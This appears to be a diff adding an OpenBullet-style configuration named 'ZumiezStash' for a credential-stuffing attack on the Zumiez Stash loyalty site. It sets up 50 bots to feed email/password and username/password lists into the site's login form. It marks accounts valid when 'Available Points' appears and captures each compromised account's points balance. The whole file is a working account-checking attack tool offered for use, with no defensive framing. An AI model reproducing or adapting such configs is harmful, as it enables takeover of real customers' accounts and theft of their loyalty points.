@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "ZumiezStash",
+  "SuggestedBots": 50,
+  "LastModified": "2018-05-22T16:57:48.2368261+02:00",
+  "AdditionalInfo": "",
+  "Author": "XJ13",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_ME REQUEST GET "https://www.thezumiezstash.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#POST_ME REQUEST POST "https://www.thezumiezstash.com/login" AutoRedirect=TRUE 
+  CONTENT "username_login=<USER>&password_login=<PASS>&op=Login&form_build_id=form-+id+&form_id=crowdtwist_login_form" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie:: __cfduid=db308e9be36774d79da52c3ac56bf2f261526996108" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.thezumiezstash.com/login" 
+  HEADER "Origin: https://www.thezumiezstash.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "The login information was incorrect. Please try again." 
+  KEYCHAIN Success OR 
+    KEY "Available Points" 
+PARSE "<SOURCE>" LR "\"num orange\">" "<" Recursive=FALSE -> CAP "Available Points" "" "" 
